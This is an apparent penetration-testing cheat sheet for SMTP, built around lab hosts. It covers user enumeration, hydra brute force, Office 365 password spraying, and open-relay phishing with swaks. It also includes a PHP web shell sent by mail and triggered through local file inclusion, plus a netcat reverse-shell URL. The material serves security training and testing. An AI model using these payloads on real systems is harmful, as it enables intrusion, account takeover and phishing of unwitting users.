# Enumeration

```
nmap -sVC -p25 --script=smtp* $IP

# search for encrypted ports
nmap -sVC -p465,587 --script=smtp* $IP
```

# Enumerate MailServer

```
# using MX DNS Record (cf DNS)
host -t MX hackthebox.eu
dig mx inlanefreight.com | grep "MX" | grep -v ";"

# retrieve IP addr of mailserver
host -t A mail1.inlanefreight.htb
```

# Bruteforce

```
hydra -L user.list -P password.list $IP -t 4 smtp

# Don’t forget to add @domain to the username : user@domain.com
```

# Interacting w/ service

```
# Initiate the session using `HELO` or `EHLO`
telnet $IP PORT
```

# Enumerate usernames

```
# Once connected, we can use `VRFY`, `EXPN`, and `RCPT TO` command to verify valid usernames
```

- `VRFY` : instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled
```
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)

VRFY root

252 2.0.0 root

VRFY www-data

252 2.0.0 www-data

VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

- `EXPN` : similar to VRFY, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the `VRFY` command since sites often have an alias such as "all."
```
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)

EXPN john

250 2.1.0 john@inlanefreight.htb

EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

- `RCPT TO` : identifies the recipient of the email message.
```
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)

MAIL <FROM:test@htb.com>
it is
250 2.1.0 test@htb.com... Sender ok

RCPT TO:julio

550 5.1.1 julio... User unknown

RCPT TO:kate

550 5.1.1 kate... User unknown

RCPT TO:john

250 2.1.5 john... Recipient ok
```

- Automate this process using [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum). The `-M` is for the enumeration mode, `-U` for the list of users to test. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument `-D`.
```bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t $IP

Starting smtp-user-enum v1.2 ( <http://pentestmonkey.net/tools/smtp-user-enum> )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.txt
Target count ............. 1
Username count ........... 78
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Apr 21 06:53:07 2022 #########
10.129.203.7: jose@inlanefreight.htb exists
10.129.203.7: pedro@inlanefreight.htb exists
10.129.203.7: kate@inlanefreight.htb exists
######## Scan completed at Thu Apr 21 06:53:18 2022 #########
3 results.

78 queries in 11 seconds (7.1 queries / sec)
```


# Write Mail To Execute Code

Linux has a directory `/var/mail/` for users to receive messages.
If we found a way to `display / get access` to a linux user mails, we could write malicious code into a mail, and then gets it executed.

For example, let's say we have found a `LFI` vulnerabilty on a website that allow us to retrive and read files on the system.
We found a valid user `michael` on the machine, and we want to execute code on the machine. 
So we know that if we send him a mail, it will appear in `/var/mail/michael`.


We could write malicious PHP code into a mail that we send to `michael`, retrieve it via the LFI, and execute it :
```
telnet 10.10.11.166 25

Trying 10.10.11.166...
Connected to 10.10.11.166.
Escape character is '^]'.
220 debian.localdomain ESMTP Postfix (Debian/GNU)

mail from: zboub
250 2.1.0 Ok

rcpt to: michael
250 2.1.5 Ok

data
354 End data with <CR><LF>.<CR><LF>

<?php system($_GET['cmd']); ?>
.
250 2.0.0 Ok: queued as 10C2C4099C
```

So now, we could leverage the code execution by visiting `http://host.com/index.php?page....//....//....//....//....//....//var/mail/michael&cmd=whoami
, and the code would get executed ! 

Don't forget to URL encode if we wanted to get a reverse shell : 
by visiting `http://host.com/index.php?page....//....//....//....//....//....//var/mail/michael&cmd=nc%2010.10.14.29%201337%20- e%20/bin/sh` 

# Cloud Mail Enumeration

- `Office 365` Username Enumeration :

[O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by [ZDH](https://twitter.com/0xzdh). We can validate if our target domain is using `Office 365` :
```
python3 o365spray.py --validate --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:46:40

>----------------------------------------<

[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```

Now, we can attempt to identify usernames :
```
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                       
            *** O365 Spray ***             

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > enum           :  True
   > userfile       :  users.txt
   > enum_module    :  office
   > rate           :  10 threads
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:48:03

>----------------------------------------<

[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : 

[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'

[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2
```

# Cloud Password Attacks

[o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta.
```
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > spray          :  True
   > password       :  March2022!
   > userfile       :  usersfound.txt
   > count          :  1 passwords/spray
   > lockout        :  1.0 minutes
   > spray_module   :  oauth2
   > rate           :  10 threads
   > safe           :  10 locked accounts
   > timeout        :  25 seconds
   > start          :  2022-04-14 12:26:31

>----------------------------------------<

[2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-14 12:26:32,202] INFO : Running password spray against 2 users.
[2022-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2022!']
[2022-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2022!
[2022-04-14 12:26:33,048] INFO : 

[ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'
[ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'

[2022-04-14 12:26:33,048] INFO : Valid Credentials: 1
```

# Open Relay Attack

An open relay is a `SMTP server` which is improperly configured and allows an unauthenticated email relay.

Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.

We can abuse this for phishing by sending emails as non-existing users or spoofing someone else's email.

For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees.

We can send a similar email using the same address and add our phishing link with this information.
With the `nmap smtp-open-relay` script, we can identify if an SMTP port allows an open relay.
```
nmap -p25 -Pn --script smtp-open-relay $IP

Starting Nmap 7.80 ( <https://nmap.org> ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

Next, we can use any mail client to connect to the mail server and send our email
```
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server $IP$

=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
<-  220 mail.localdomain SMTP Mailer ready
 -> EHLO parrot
<-  250-mail.localdomain
<-  250-SIZE 33554432
<-  250-8BITMIME
<-  250-STARTTLS
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<-  250 HELP
 -> MAIL FROM:<notifications@inlanefreight.com>
<-  250 OK
 -> RCPT TO:<employees@inlanefreight.com>
<-  250 OK
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 29 Oct 2020 01:36:06 -0400
 -> To: employees@inlanefreight.com
 -> From: notifications@inlanefreight.com
 -> Subject: Company Notification
 -> Message-Id: <20201029013606.775675@parrot>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Hi All, we want to hear from you! Please complete the following survey. <http://mycustomphishinglink.com/>
 -> 
 -> 
 -> .
<-  250 OK
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```

# CVE-2020-7247

Vulnerabilities was discovered in [OpenSMTPD](https://www.opensmtpd.org/) up to version 6.6.2, and lead to RCE.

# SMTP Commands

|**Command**|**Description**|
|---|---|
|`AUTH PLAIN`|AUTH is a service extension used to authenticate the client.|
|`HELO`|The client logs in with its computer name and thus starts the session.|
|`MAIL FROM`|The client names the email sender.|
|`RCPT TO`|The client names the email recipient.|
|`DATA`|The client initiates the transmission of the email.|
|`RSET`|The client aborts the initiated transmission but keeps the connection between client and server.|
|`VRFY`|The client checks if a mailbox is available for message transfer. Can be used to enumerate existing users.|
|`EXPN`|The client also checks if a mailbox is available for messaging with this command.|
|`NOOP`|The client requests a response from the server to prevent disconnection due to time-out.|
|`QUIT`|The client terminates the session.|

# Remediation

```
# conf file
/etc/postfix/main.cf
```

A current misconfiguration of the SMTP server is to allow all IP addresses not to cause errors or disturb the email traffic.
This is called the `Open Relay Configuration`

|Dangerous settings|**Description**|
|---|---|
|`mynetworks = 0.0.0.0/0`||

With this setting, this SMTP server can send fake emails and thus initialize communication between multiple parties.
Another attack possibility would be to spoof the email and read it.

To prevent the sent emails from being filtered by spam filters and not reaching the recipient, the sender can use a relay server that the recipient trusts.
It is an SMTP server that is known and verified by all others.
As a rule, the sender must authenticate himself to the relay server before using it.

It is also recommanded to use the extension of SMTP `Extended SMTP` (`ESMTP`) because it uses TLS.

We also need to be careful and don’t allow anonymous login.